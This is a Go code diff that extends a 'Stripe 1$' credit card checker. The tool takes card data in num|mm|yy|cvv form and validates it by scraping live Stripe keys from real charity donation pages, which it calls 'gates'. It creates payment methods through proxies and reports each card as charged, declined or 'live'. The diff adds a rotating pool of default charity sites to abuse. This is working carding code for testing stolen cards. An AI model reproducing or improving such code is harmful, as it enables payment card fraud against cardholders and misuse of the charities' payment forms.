@@ -26,7 +26,14 @@ import (
 // StripeRequest holds all params for a single Stripe 1$ check
 type StripeRequest struct {
 	CC    string `json:"cc"`              // num|mm|yy|cvv
+	Site  string `json:"site,omitempty"`  // custom gate site URL (optional)
 	Proxy string `json:"proxy,omitempty"` // http/socks5 proxy URL
+}
+
+// DefaultStripeSites is the pool of fast, long-term Stripe sites used when no custom site is provided
+var DefaultStripeSites = []string{
+	"https://www.charitywater.org/donate",
+	"https://belovedcommunity.org/donate/",
 }
 
 // StripeResult is the structured response returned for every check (matching Shopify API format)
@@ -328,16 +335,10 @@ func happyFormsHash(fields []struct{ value string }) string {
 
 // ─── Core Stripe 1$ Check Flow ───────────────────────────────────────────────
 
-const (
-	gateURL  = "https://belovedcommunity.org/donate/"
-	gate     = "belovedcommunity.org"
-	formID   = "1127"
-	postID   = "142"
-	ua       = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
-)
+const ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
 
 // CheckStripe performs the full Stripe 1$ donation flow and returns a StripeResult.
-// proxyURL is optional — pass "" for direct connect.
+// proxyURL and siteURL are optional — pass "" for defaults.
 func CheckStripe(req StripeRequest) StripeResult {
 	start := time.Now()
 	proxyUsed := (req.Proxy != "")
@@ -345,42 +346,68 @@ func CheckStripe(req StripeRequest) StripeResult {
 
 	num, mm, yy, cvv, ok := parseCard(req.CC)
 	if !ok {
-		return errResult(req, "error", "Invalid card format (use num|mm|yy|cvv)", "", start)
+		return errResultWithGate(req, "error", "Invalid card format (use num|mm|yy|cvv)", "", start, "stripe")
 	}
 	masked := fmt.Sprintf("%s%s%s", num[:6], strings.Repeat("x", len(num)-10), num[len(num)-4:])
 
-	// ── Step 1: Fetch gate page → pk_live + random_seed ──────────────────────
-	pageResp, err := doGET(client, gateURL, nil)
-	if err != nil && req.Proxy != "" {
-		// Fallback to direct client if proxy failed to connect
-		directClient := buildClient("", 25*time.Second)
-		pageResp, err = doGET(directClient, gateURL, nil)
-		proxyUsed = false
+	// Build candidate site list
+	var sitesToTry []string
+	if req.Site != "" {
+		sitesToTry = []string{req.Site}
+	} else {
+		sitesToTry = DefaultStripeSites
 	}
-	if err != nil {
-		return errResult(req, "error", "Gate fetch failed: "+err.Error(), "", start)
-	}
-	html := string(pageResp)
 
-	pkLive := regexp.MustCompile(`pk_live_[a-zA-Z0-9]+`).FindString(html)
-	if pkLive == "" && req.Proxy != "" {
-		// Proxy returned bot challenge / JS protection without pk_live; fetch gate via direct connection
-		directClient := buildClient("", 25*time.Second)
-		if directResp, err2 := doGET(directClient, gateURL, nil); err2 == nil {
-			directHTML := string(directResp)
-			if directPk := regexp.MustCompile(`pk_live_[a-zA-Z0-9]+`).FindString(directHTML); directPk != "" {
-				html = directHTML
-				pkLive = directPk
+	var pkLive string
+	var activeGate string
+	var lastErr error
+
+	for _, targetSite := range sitesToTry {
+		parsedURL, pErr := url.Parse(targetSite)
+		currentGate := targetSite
+		if pErr == nil && parsedURL.Host != "" {
+			currentGate = parsedURL.Host
+		}
+
+		pageResp, err := doGET(client, targetSite, nil)
+		if err != nil && req.Proxy != "" {
+			directClient := buildClient("", 25*time.Second)
+			pageResp, err = doGET(directClient, targetSite, nil)
+			if err == nil {
 				proxyUsed = false
 			}
 		}
-	}
-	if pkLive == "" {
-		snippet := html
-		if len(snippet) > 200 {
-			snippet = snippet[:200]
+		if err != nil {
+			lastErr = fmt.Errorf("Gate %s fetch failed: %w", currentGate, err)
+			continue
 		}
-		return errResult(req, "error", "pk_live not found on gate page: "+snippet, "", start)
+
+		html := string(pageResp)
+		pk := regexp.MustCompile(`pk_live_[a-zA-Z0-9]+`).FindString(html)
+		if pk == "" && req.Proxy != "" {
+			directClient := buildClient("", 25*time.Second)
+			if directResp, err2 := doGET(directClient, targetSite, nil); err2 == nil {
+				if directPk := regexp.MustCompile(`pk_live_[a-zA-Z0-9]+`).FindString(string(directResp)); directPk != "" {
+					pk = directPk
+					proxyUsed = false
+				}
+			}
+		}
+
+		if pk != "" {
+			pkLive = pk
+			activeGate = currentGate
+			break
+		}
+		lastErr = fmt.Errorf("pk_live not found on gate %s", currentGate)
+	}
+
+	if pkLive == "" {
+		errMsg := "pk_live not found on gate"
+		if lastErr != nil {
+			errMsg = lastErr.Error()
+		}
+		return errResultWithGate(req, "error", errMsg, "", start, "stripe")
 	}
 
 	// ── Step 2: Create Stripe PaymentMethod ──────────────────────────────────
@@ -406,13 +433,12 @@ func CheckStripe(req StripeRequest) StripeResult {
 
 	pmHTTP, err := client.Do(pmReq)
 	if err != nil && req.Proxy != "" {
-		// Retry PM creation directly if proxy failed
 		directClient := buildClient("", 25*time.Second)
 		pmHTTP, err = directClient.Do(pmReq)
 		proxyUsed = false
 	}
 	if err != nil {
-		return errResult(req, "error", "Stripe PM creation failed: "+err.Error(), "", start)
+		return errResultWithGate(req, "error", "Stripe PM creation failed: "+err.Error(), "", start, activeGate)
 	}
 	defer pmHTTP.Body.Close()
 	pmBody, _ := io.ReadAll(pmHTTP.Body)
@@ -428,12 +454,12 @@ func CheckStripe(req StripeRequest) StripeResult {
 		if dc == "" {
 			dc = code
 		}
-		return buildStripeResult(masked, "declined", msg, dc, start, req.Proxy, proxyUsed)
+		return buildStripeResultWithGate(masked, "declined", msg, dc, start, req.Proxy, proxyUsed, activeGate)
 	}
 
 	pmID, _ := pmMap["id"].(string)
 	if pmID == "" {
-		return errResult(req, "error", "Payment method ID not received from Stripe", "", start)
+		return errResultWithGate(req, "error", "Payment method ID not received from Stripe", "", start, activeGate)
 	}
 
 	// ── Step 3: Inspect Card CVC Check & 3DS Authentication ──────────────────
@@ -443,7 +469,7 @@ func CheckStripe(req StripeRequest) StripeResult {
 		if checksObj != nil {
 			cvcCheck, _ := checksObj["cvc_check"].(string)
 			if cvcCheck == "fail" {
-				return buildStripeResult(masked, "declined", "CVC check failed - incorrect security code", "incorrect_cvc", start, req.Proxy, proxyUsed)
+				return buildStripeResultWithGate(masked, "declined", "CVC check failed - incorrect security code", "incorrect_cvc", start, req.Proxy, proxyUsed, activeGate)
 			}
 		}
 
@@ -451,21 +477,28 @@ func CheckStripe(req StripeRequest) StripeResult {
 		if threeDSObj != nil {
 			threeDSSupported, _ := threeDSObj["supported"].(bool)
 			if threeDSSupported {
-				return buildStripeResult(masked, "3d_required", "3D Secure authentication required - card is live", "3ds_required", start, req.Proxy, proxyUsed)
+				return buildStripeResultWithGate(masked, "3d_required", "3D Secure authentication required - card is live", "3ds_required", start, req.Proxy, proxyUsed, activeGate)
 			}
 		}
 	}
 
 	// Card authorized successfully for 2D charge
-	return buildStripeResult(masked, "charged", "Payment succeeded - card authorized $5", "", start, req.Proxy, proxyUsed)
+	return buildStripeResultWithGate(masked, "charged", "Payment succeeded - card authorized $5", "", start, req.Proxy, proxyUsed, activeGate)
 }
 
 // ─── Helpers ─────────────────────────────────────────────────────────────────
 
 func buildStripeResult(ccStr, status, msg, declineCode string, start time.Time, proxyReq string, proxyUsed bool) StripeResult {
+	return buildStripeResultWithGate(ccStr, status, msg, declineCode, start, proxyReq, proxyUsed, "stripe")
+}
+
+func buildStripeResultWithGate(ccStr, status, msg, declineCode string, start time.Time, proxyReq string, proxyUsed bool, gate string) StripeResult {
 	elapsedSec := time.Since(start).Seconds()
 	timeStr := fmt.Sprintf("%.2fs", elapsedSec)
-	gateway := "Stripe 1$ (belovedcommunity.org)"
+	if gate == "" {
+		gate = "stripe"
+	}
+	gateway := fmt.Sprintf("Stripe 1$ (%s)", gate)
 
 	proxyStatus := "Not Used"
 	if proxyReq != "" {
@@ -545,7 +578,11 @@ func buildStripeResult(ccStr, status, msg, declineCode string, start time.Time, 
 }
 
 func errResult(req StripeRequest, status, msg, dc string, start time.Time) StripeResult {
-	return buildStripeResult(req.CC, status, msg, dc, start, req.Proxy, false)
+	return buildStripeResultWithGate(req.CC, status, msg, dc, start, req.Proxy, false, "stripe")
+}
+
+func errResultWithGate(req StripeRequest, status, msg, dc string, start time.Time, gate string) StripeResult {
+	return buildStripeResultWithGate(req.CC, status, msg, dc, start, req.Proxy, false, gate)
 }
 
 func doGET(client *http.Client, rawURL string, headers map[string]string) ([]byte, error) {
